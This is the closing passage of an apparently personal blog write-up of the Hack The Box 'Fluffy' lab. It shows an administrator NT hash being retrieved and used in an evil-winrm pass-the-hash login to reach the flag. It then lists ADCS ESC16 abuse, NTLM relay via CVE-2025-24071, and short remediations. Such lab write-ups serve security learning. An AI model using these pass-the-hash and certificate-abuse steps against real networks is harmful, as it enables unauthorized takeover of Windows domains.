</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying to retrieve NT <span class=nb>hash</span> <span class=k>for</span> <span class=s1>&#39;administrator&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got <span class=nb>hash</span> <span class=k>for</span> <span class=s1>&#39;administrator@fluffy.htb&#39;</span>: REDACTED
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Evil-WinRM shell v3.7
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class=sb>`</span>quoting_detection_proc<span class=err>&#39;</span> <span class=k>for</span> module Reline                        
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                   
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ..
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator&gt; <span class=nb>cd</span> desktop
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\d</span>esktop&gt; dir
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                -------------         ------ ----
</span></span><span class=line><span class=cl>-ar---        9/16/2025   8:08 PM             <span class=m>34</span> root.txt
</span></span></code></pre></div><h2 class="relative group">New attack methods learned<div id=new-attack-methods-learned class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#new-attack-methods-learned aria-label=Anchor>#</a></span></h2><ul><li>ADCS ESC16 attack chain</li><li>NTLM relay with malicious .zip file via CVE-2025-24071</li></ul><h2 class="relative group">Possible Remediations<div id=possible-remediations class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#possible-remediations aria-label=Anchor>#</a></span></h2><ul><li>Apply vendor patches for ADCS services and keep PKI components fully updated</li><li>Restrict certificate template permissions and regularly audit ADCS configurations to prevent abuse</li></ul></div><section class="flex flex-row flex-wrap justify-center pt-4 text-xl"><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://localhost:1313/writeups/htb-fluffy/&amp;title=Htb-fluffy" title="Share on LinkedIn" aria-label="Share on LinkedIn"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentcolor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://twitter.com/intent/tweet/?url=https://localhost:1313/writeups/htb-fluffy/&amp;text=Htb-fluffy" title="Tweet on Twitter" aria-label="Tweet on Twitter"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
</a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://bsky.app/intent/compose?text=Htb-fluffy+https://localhost:1313/writeups/htb-fluffy/" title="Post on Bluesky" aria-label="Post on Bluesky"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M256 232.562c-21.183-41.196-78.868-117.97-132.503-155.834-51.378-36.272-70.978-29.987-83.828-24.181-14.872 6.72-17.577 29.554-17.577 42.988.0 13.433 7.365 110.138 12.169 126.281 15.873 53.336 72.376 71.358 124.413 65.574 2.66-.395 5.357-.759 8.089-1.097-2.68.429-5.379.796-8.089 1.097-76.259 11.294-143.984 39.085-55.158 137.972C201.224 526.527 237.424 403.67 256 341.379c18.576 62.291 39.972 180.718 150.734 83.983 83.174-83.983 22.851-126.674-53.408-137.969-2.71-.302-5.409-.667-8.089-1.096 2.732.337 5.429.702 8.089 1.096 52.037 5.785 108.54-12.239 124.413-65.574 4.804-16.142 12.169-112.847 12.169-126.281.0-13.434-2.705-36.267-17.577-42.988-12.85-5.806-32.45-12.09-83.829 24.181C334.868 114.595 277.183 191.366 256 232.562z"/></svg></span>
</a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://reddit.com/submit/?url=https://localhost:1313/writeups/htb-fluffy/&amp;resubmit=true&amp;title=Htb-fluffy" title="Submit to Reddit" aria-label="Submit to Reddit"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M201.5 305.5c-13.8.0-24.9-11.1-24.9-24.6.0-13.8 11.1-24.9 24.9-24.9 13.6.0 24.6 11.1 24.6 24.9.0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4.0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7.0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9.0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5.0 52.6 59.2 95.2 132 95.2 73.1.0 132.3-42.6 132.3-95.2.0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6.0-2.2-2.2-6.1-2.2-8.3.0-2.5 2.5-2.5 6.4.0 8.6 22.8 22.8 87.3 22.8 110.2.0 2.5-2.2 2.5-6.1.0-8.6-2.2-2.2-6.1-2.2-8.3.0zm7.7-75c-13.6.0-24.6 11.1-24.6 24.9.0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.1 24.9-24.6.0-13.8-11-24.9-24.9-24.9z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://api.whatsapp.com/send?text=https://localhost:1313/writeups/htb-fluffy/&amp;resubmit=true&amp;title=Htb-fluffy" title="Share via WhatsApp" aria-label="Share via WhatsApp"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentcolor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4.0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3.0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2.0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2.0-101.7 82.8-184.5 184.6-184.5 49.3.0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5.0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8s-14.3 18-17.6 21.8c-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2s-9.7 1.4-14.8 6.9c-5.1 5.6-19.4 19-19.4 46.3.0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://t.me/share/url?url=https://localhost:1313/writeups/htb-fluffy/&amp;resubmit=true&amp;title=Htb-fluffy" title="Share via Telegram" aria-label="Share via Telegram"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M248 8C111.033 8 0 119.033.0 256S111.033 504 248 504 496 392.967 496 256 384.967 8 248 8zM362.952 176.66c-3.732 39.215-19.881 134.378-28.1 178.3-3.476 18.584-10.322 24.816-16.948 25.425-14.4 1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25 5.342-39.5 3.652-3.793 67.107-61.51 68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608 69.142-14.845 10.194-26.894 9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7 18.45-13.7 108.446-47.248 144.628-62.3c68.872-28.647 83.183-33.623 92.511-33.789 2.052-.034 6.639.474 9.61 2.885a10.452 10.452.0 013.53 6.716A43.765 43.765.0 01362.952 176.66z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://pinterest.com/pin/create/bookmarklet/?url=https://localhost:1313/writeups/htb-fluffy/&amp;description=Htb-fluffy" title="Pin on Pinterest" aria-label="Pin on Pinterest"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentcolor" d="M496 256c0 137-111 248-248 248-25.6.0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8.0 128.7-68.8 128.7-154.3.0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1.0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6.0-54.7 41.4-107.6 112-107.6 60.9.0 103.6 41.5 103.6 100.9.0 67.1-33.9 113.6-78 113.6-24.3.0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6.0-19-10.2-34.9-31.4-34.9-24.9.0-44.9 25.7-44.9 60.2.0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9.0 361.1.0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.facebook.com/sharer/sharer.php?u=https://localhost:1313/writeups/htb-fluffy/&amp;quote=Htb-fluffy" title="Share on Facebook" aria-label="Share on Facebook"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14.0 55.52 4.84 55.52 4.84v61h-31.28c-30.8.0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="mailto:?body=https://localhost:1313/writeups/htb-fluffy/&amp;subject=Htb-fluffy" title="Send via email" aria-label="Send via email"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://line.me/R/share?text=https://localhost:1313/writeups/htb-fluffy/%20Htb-fluffy" title="Share on LINE" aria-label="Share on LINE"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M311 196.8v81.3c0 2.1-1.6 3.7-3.7 3.7h-13c-1.3.0-2.4-.7-3-1.5L254 230v48.2c0 2.1-1.6 3.7-3.7 3.7h-13c-2.1.0-3.7-1.6-3.7-3.7V196.9c0-2.1 1.6-3.7 3.7-3.7h12.9c1.1.0 2.4.6 3 1.6l37.3 50.3V196.9c0-2.1 1.6-3.7 3.7-3.7h13c2.1-.1 3.8 1.6 3.8 3.5zm-93.7-3.7h-13c-2.1.0-3.7 1.6-3.7 3.7v81.3c0 2.1 1.6 3.7 3.7 3.7h13c2.1.0 3.7-1.6 3.7-3.7V196.8c0-1.9-1.6-3.7-3.7-3.7zm-31.4 68.1H150.3V196.8c0-2.1-1.6-3.7-3.7-3.7h-13c-2.1.0-3.7 1.6-3.7 3.7v81.3c0 1 .3 1.8 1 2.5.7.6 1.5 1 2.5 1h52.2c2.1.0 3.7-1.6 3.7-3.7v-13c0-1.9-1.6-3.7-3.5-3.7zm193.7-68.1H327.3c-1.9.0-3.7 1.6-3.7 3.7v81.3c0 1.9 1.6 3.7 3.7 3.7h52.2c2.1.0 3.7-1.6 3.7-3.7V265c0-2.1-1.6-3.7-3.7-3.7H344V247.7h35.5c2.1.0 3.7-1.6 3.7-3.7V230.9c0-2.1-1.6-3.7-3.7-3.7H344V213.5h35.5c2.1.0 3.7-1.6 3.7-3.7v-13c-.1-1.9-1.7-3.7-3.7-3.7zM512 93.4v326c-.1 51.2-42.1 92.7-93.4 92.6H92.6C41.4 511.9-.1 469.8.0 418.6V92.6C.1 41.4 42.2-.1 93.4.0h326c51.2.1 92.7 42.1 92.6 93.4zM441.6 233.5c0-83.4-83.7-151.3-186.4-151.3S68.8 150.1 68.8 233.5c0 74.7 66.3 137.4 155.9 149.3 21.8 4.7 19.3 12.7 14.4 42.1-.8 4.7-3.8 18.4 16.1 10.1s107.3-63.2 146.5-108.2c27-29.7 39.9-59.8 39.9-93.1z"/></svg></span></a></section></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_writeups/htb-fluffy.md data-oid-likes=likes_writeups/htb-fluffy.md></script></section><footer class="pt-8 max-w-prose print:hidden"></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 overflow-x-auto py-2"><ul class="flex list-none flex-row"><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ltr:mr-4 rtl:ml-4"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href title></a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
BeejaySec</p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script><a rel=me href=https://masto.ai/@blowfish></a><script src=/js/copy.js></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://localhost:1313/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>